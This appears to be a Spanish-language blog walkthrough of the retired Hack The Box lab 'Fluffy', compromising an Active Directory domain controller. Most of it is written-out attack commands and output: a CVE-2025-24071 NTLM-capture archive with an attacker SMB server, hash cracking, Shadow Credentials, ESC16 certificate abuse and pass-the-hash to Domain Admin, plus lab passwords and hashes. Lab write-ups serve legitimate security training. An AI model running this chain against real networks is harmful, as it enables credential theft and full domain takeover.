---
title: "Fluffy"
layout: "post"
categories: [ "HTB - Retired Machines", "Easy" ]
tags: [ "nmap", "ntpdate", "smbmap", "smbserver", "hashcat", "bloodhound-python", "net", "pywhisker", "netexec", "certipy", "evil-winrm" ]
---

## Info

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/01_fluffy.png)
*Fluffy - HTB (Easy)*

En este post, quiero compartir cómo resolví la máquina retirada **Fluffy** de Hack the Box, clasificada como *Easy*. Esta máquina pone a prueba habilidades básicas de enumeración y explotación de servicios comunes en entornos de Windows.

**Credenciales de inicio**

> La máquina ofrece credenciales válidas desde el inicio: `j.fleischman:J0elTHEM4n1990!`

## Nmap

Primero verifico si el host está activo mediante el envío de un paquete **ICMP**:

```shell
ping -c 1 10.10.11.69 
```
Una vez confirmada su disponibilidad, realizo un escaneo completo de puertos con `nmap`:

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.69 -oG allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127

...SNIP...
```

> Tip: Utilizo la función [extractPorts](https://pastebin.com/xNaZxRGA) para extraer los puertos abiertos del archivo `allPorts`, lo que facilita copiar los puertos relevantes al siguiente escaneo.
{: .prompt-tip }

```shell
nmap -sCV -p53,88,139,389,445,464,593,636,3268,3269,5985 10.10.11.69 -oN version

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy

...SNIP...
```

El escaneo mostró el nombre de host **(DC01.fluffy.htb)** y el dominio **(fluffy.htb)**. En consecuencia, agrego el dominio a mi archivo **/etc/hosts** para que mi host pueda resolver el nombre de dominio de manera correcta.

Esto es necesario para que herramientas como `evil-winrm` o `bloodhound-python` puedan comunicarse correctamente con el dominio.

```shell
echo "10.10.11.69 DC01.fluffy.htb dc01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
```
## ntpdate 

Dado que el sistema está usando Kerberos para autenticación, es crucial que mi máquina esté sincronizada con el tiempo del servidor. Si no lo hacemos, podríamos tener problemas al intentar interactuar con ciertos servicios o realizar ataques que dependen de la hora del sistema. Para sincronizar el tiempo, utilizo el comando `ntpdate` para ajustar la hora de mi máquina con la del dominio.

```shell
sudo ntpdate fluffy.htb
```

## SMB

Con el dominio configurado y la hora sincronizada, comienzo la enumeración de recursos compartidos de la máquina utilizando `smbmap`. Ya que cuento con credenciales válidas, me autentico directamente.

```shell
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --no-banner

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.69:445	Name: DC01.fluffy.htb     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections                                                                           
```

El resultado muestra que tengo acceso a varios recursos compartidos. Destaca el recurso **IT**, que tiene permisos de **lectura y escritura**, lo que indica que tengo la capacidad para **listar, modificar o cargar archivos** en él.

```shell
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' -r 'IT' --no-banner

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.69:445	Name: DC01.fluffy.htb     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	./IT
	dr--r--r--                0 Fri Sep 19 02:07:56 2025	.
	dr--r--r--                0 Fri Sep 19 02:07:56 2025	..
	dr--r--r--                0 Fri May 16 09:51:49 2025	Everything-1.4.1.1026.x64
	fr--r--r--          1827464 Fri May 16 09:51:49 2025	Everything-1.4.1.1026.x64.zip
	dr--r--r--                0 Fri May 16 09:51:49 2025	KeePass-2.58
	fr--r--r--          3225346 Fri May 16 09:51:49 2025	KeePass-2.58.zip
	fr--r--r--           169963 Sat May 17 09:31:07 2025	Upgrade_Notice.pdf
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```

El recurso **IT** contiene varios archivos potencialmente interesantes, aunque ninguno parece crítico a primera vista. Sin embargo, entre los archivos destacan dos archivos comprimidos y un PDF:

- `Everything-1.4.1.1026.x64.zip`
- `KeePass-2.58.zip`
- `Upgrade_Notice.pdf`

### Upgrade_Notice.pdf 

Decido inspeccionar los archivos, pero los ZIP no contienen nada relevante. Sin embargo, el archivo **Upgrade_Notice.pdf** me llama la atención, así que lo reviso:

```shell
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --download 'IT/Upgrade_Notice.pdf' --no-banner

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] Starting download: IT\Upgrade_Notice.pdf (169963 bytes)                                                              
[+] File output to: /home/f4dee/Documentos/Fluffy/10.10.11.69-IT_Upgrade_Notice.pdf                                      
[*] Closed 1 connections 
```

El PDF resulta ser un reporte del **Departamento de IT** que expone diversas vulnerabilidades críticas que necesitan ser parchadas cuanto antes. En particular, menciona las siguientes dos vulnerabilidades:

- CVE-2025-24996
- CVE-2025-24071

Intento explotar **CVE-2025-24996**, pero no obtuve resultados. En cambio, [CVE-2025-24071](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) resulta más prometedor.

Esta vulnerabilidad permite aprovechar una debilidad en cómo Windows maneja los archivos `.library-ms`, permitiendo el filtrado de credenciales **NTLMv2**, sin la intervención del usuario. Ocurre cuando estos archivos son extraídos de un comprimido.

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/02_report.png)
*Critical Vulnerabilities*

## CVE-2025-24071

A partir de aquí, la explotación se vuelve más interesante. Entonces preparemos los ingredientes:

- Generar un archivo malicioso `.library-ms`, que se incluirá en un comprimido (RAR/ZIP).
- Una forma de subir el comprimido (mmm... `IT`).
- Iniciar un servidor SMB (a libre elección `smbserver` o `responder`).

Para ello puedes usar [mi script en Bash](https://github.com/f4dee-backup/CVE-2025-24071), para automatizar los dos primeros pasos, o bien realizar la explotación manualmente.

**Iniciar el servidor SMB**

```shell
sudo impacket-smbserver smbFolder $(pwd) -smb2support
```

**Clonar el repositorio**

```shell
git clone https://github.com/f4dee-backup/CVE-2025-24071
```

Finalmente, le doy permisos de ejecución y lo ejecuto.

```shell
./CVE-2025-24071.sh -i 'YOUR_IP' -t '10.10.11.69' -d 'IT' -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/03_CVE-2025-24071.png)
*Capture NTLM*

Cuando el usuario en la máquina víctima abre el archivo comprimido, obtengo el hash **NTLMv2** del usuario `p.agila`. Utilizo `hashcat` junto con el diccionario `rockyou.txt` para crackear el hash. Después de un breve momento, obtengo la contraseña: `prometheusx-303`

```shell
hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt --quiet

P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:52a89d461c631a6b9688c9340ad83d73:0101000000000000805716574029dc019a8bf7035993028a00000000010010006f0059004200770076004e0075007700030010006f0059004200770076004e007500770002001000450066004a0049005700550075006c0004001000450066004a0049005700550075006c0007000800805716574029dc01060004000200000008003000300000000000000001000000002000007f78754f0aa39af5499dfc3db8344a937db65f4c8a69363bdc726c5bd895d4420a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00390038000000000000000000:prometheusx-303
```

## Bloodhound

En este punto, quiero obtener más información sobre el dominio, relaciones de privilegios y posibles caminos hacia **Administrator**. Para ello, utilizo la herramienta `BloodHound`, que representa gráficamente relaciones entre usuarios, grupos y permisos en Active Directory.

Para recolectar la información desde la terminal, uso `bloodhound-python`.

```shell
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c All --zip
```

A continuación instalaré el cliente de BloodHound para visualizar los datos.

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

> Puedes consultar sobre BloodHound [aquí](https://bloodhound.specterops.io/get-started/introduction).
{: .prompt-info }

Una vez instalado me proporcionan credenciales, accedo al servicio web que corre en el puerto 8080. Me autentico, genero una nueva contraseña y subo el archivo **.zip** generado.

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/04_BhLogin.png)
*Authentication to BloodHound*

## Lateral Movement

Veamos, el usuario **p.agila** tiene permisos [GenericAll](https://www.hackingarticles.in/genericall-active-directory-abuse/) sobre el grupo **SERVICE ACCOUNTS**. Por tanto, me da control total sobre el objeto, lo que me permite: **restablecer contraseñas, añadir o eliminar miembros del grupo entre otras acciones**.

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/05_genericAll.png)

Asimismo, el grupo **SERVICE ACCOUNTS** tiene permisos [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write) sobre ciertos usuarios: `ldap_svc, ca_svc y winrm_svc`. Esto da pie a realizar ataques como [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting) o [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/06_genericWrite.png)

El usuario `ca_svc` pertenece al grupo **Cert Publishers**, relacionado con **Active Directory Certificate Services (AD CS)**. Abriendo la puerta a **escalada de privilegios** o **movimiento lateral**, en caso de existir [plantillas de certificados](https://legacy.thehacker.recipes/a-d/movement/ad-cs/certificate-templates) mal configuradas.

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/07_caUser.png)

### Shadow Credentials

Shadow credenciales permite a un actor malicioso aprovechar permisos incorrectos sobre el atributo `msDS-KeyCredentialLink`, lo que le permite inyectar su propia clave pública en dicho atributo de una cuenta de usuario o equipo objetivo. Con esto, puede suplantar a la cuenta objetivo utilizando **PKINIT**. A continuación, inicio el ataque:

**Añadiendo a `p.agila` al grupo `SERVICE ACCOUNTS`**

Primero, añado al grupo para heredar los permisos:

```shell
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U fluffy.htb/p.agila%'prometheusx-303' -S 10.10.11.69
```

Verifico que la operación se realizó correctamente:

```shell
net rpc group members "SERVICE ACCOUNTS" -U fluffy.htb/p.agila%"prometheusx-303" -S 10.10.11.69

FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

**Manipulando el atributo msDs-KeyCredentialLink**

```shell
python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"

[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 684a203f-09b8-0cba-e922-3f6cf047fc01
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: dG811NFD.pfx
[+] PFX exportiert nach: dG811NFD.pfx
[i] Passwort für PFX: 8x90BSfoc3tCrrL5VtiE
[+] Saved PFX (#PKCS12) certificate & key at path: dG811NFD.pfx
[*] Must be used with password: 8x90BSfoc3tCrrL5VtiE
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

**Obteniendo un TGT**

Ahora clono el repositorio `PKINITtools` para solicitar un TGT usando el certificado:

```shell
python3 gettgtpkinit.py -cert-pfx dG811NFD.pfx -pfx-pass 8x90BSfoc3tCrrL5VtiE fluffy.htb/ca_svc ca_svc.ccache
```

El resultado indica que se ha almacenado un TGT válido con el nombre `ca_svc.ccache`. 

**Obteniendo el hash NT del usuario `ca_svc`**

Con el TGT, ahora uso `getnthash.py` para obtener el hash NT del usuario **ca_svc**:

```shell
KRB5CCNAME=ca_svc.ccache python3 getnthash.py -key b594a0b85dd92afa860503cb68af2457ee4d7510d298ad2c8cf7e1c94f003523 -dc-ip 10.10.11.69 fluffy.htb/ca_svc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

**Validando hash NT de `ca_svc` (Pass-the-Hash)**

Finalmente, hago Pass-the-Hash para validar que el hash funciona correctamente:

```shell
nxc smb 10.10.11.69 -u 'ca_svc' -H ca0f4f9e9eb8a092addf53bb03fc98c8

SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 
```

## PrivEsc (ESC16)

Ya con acceso al usuario **ca_svc**, utilizo `certipy` para encontrar configuraciones inseguras en CAs (Certified Authorities).

```shell
certipy-ad find -vulnerable -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

El output detecta que `fluffy-DC01-CA` es vulnerable a [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Esto permite abusar del campo UserPrincipalName (UPN) para suplantar identidades.

**1. Leer el UPN actual del usuario `ca_svc` (OPTIONAL)**

```shell
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb

...SNIP...
```

> En caso de no tener permisos suficientes, asegúrate de volver a añadir a `p.agila` al grupo `SERVICE ACCOUNTS`, ya que una tarea programada revierte su membresía.
{: .prompt-tip }

**2. Cambiar el UPN de `ca_svc` al de `administrator`**

```shell
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

**3. Solicitar un certificado como `"administrator"`**

```shell
KRB5CCNAME=ca_svc.ccache certipy-ad req -k -dc-ip 10.10.11.69 -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 29
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**4. Restaurar el UPN original de `ca_svc`**

```shell
certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

**5. Autenticación como `administrator` a través del certificado emitido**

```shell
certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:<nothing interest here>
```

Finalmente, obtenemos el TGT y hash NT del usuario `administrator`, luego confirmamos el acceso con `nxc`.

**Validando hash NT de `administrator` (Pass-the-Hash)**

```shell
nxc smb 10.10.11.69 -u 'administrator' -H <nothing interest here>
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\administrator:<nothing interest here> (Pwn3d!)
```

Con el hash NT de `administrator`, obtenemos privilegios de **Domain Admin**, y como era de esperarse: **`Pwn3d!`**.

Realizo la conexión con `evil-winrm` para obtener el contenido de las flags: `user.txt` y `root.txt`

![Fluffy](/assets/posts/2025-09-20-fluffy-machines-htb/08_admin.png)
